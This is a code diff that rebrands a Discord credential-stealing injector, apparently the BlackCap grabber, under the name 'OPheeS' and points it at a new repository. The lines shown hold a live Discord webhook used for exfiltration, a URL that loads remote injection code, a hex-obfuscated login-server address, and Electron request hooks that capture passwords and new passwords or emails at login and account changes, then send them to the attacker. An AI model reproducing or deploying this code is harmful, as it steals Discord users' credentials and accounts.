@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/ofyria/jsrep/main/index.js",
     webhook: "https://discord.com/api/webhooks/1083525496408637480/ha_Nx3zf0bKqCromUS3qjc8euFbOb2jionSh3heLIlpxG7SbGIkzGzmPqEGKPZdmkN8r",
     uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
@@ -58,7 +58,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Ophelia Smasher",
+        username: "OPheeS Smasher V0.1",
         avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         content: "",
         embeds: [{
@@ -67,7 +67,7 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: "OPheeS"
+                name: "Ophelia"
             },
             footer: {
                 text: "©ofiria1088"
@@ -320,7 +320,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[OPheeS 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                value: `[OPheeS 2023 <a:blackcapgif:1041634542093619260>](https://github.com/ofyria/jsrep)`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -412,7 +412,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                    value: `[OPheeS 2023 <a:blackcapgif:1041634542093619260>](https://github.com/ofyria/jsrep)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -550,8 +550,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "BlackCap User Login",
-                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Smmmmmashed someone**](https://github.com/KSCHdsc)",
+                title: "OPheeS User Login",
+                description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Smmmmmashed someone**](https://github.com/ofyria/jsrep)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -587,7 +587,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                    value: `[OPheeS 2023 <a:blackcapgif:1041634542093619260>](https://github.com/ofyria/jsrep)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -631,8 +631,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Smmaaaaaaaaaaashed someone**](https://github.com/KSCHdsc)",
+                    title: "OPheeS Detect Password Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Smmaaaaaaaaaaashed someone**](https://github.com/ofyria/jsrep)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -668,7 +668,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        value: `[OPheeS 2023 <a:blackcapgif:1041634542093619260>](https://github.com/ofyria/jsrep)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -718,8 +718,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "BlackCap Detect Email Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Smaaaashed someone**](https://github.com/KSCHdsc)",
+                    title: "OPheeS Detect Email Changed",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have Smaaaashed someone**](https://github.com/ofyria/jsrep)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -755,7 +755,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                        value: `[OPheeS 2023 <a:blackcapgif:1041634542093619260>](https://github.com/ofyria/jsrep)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
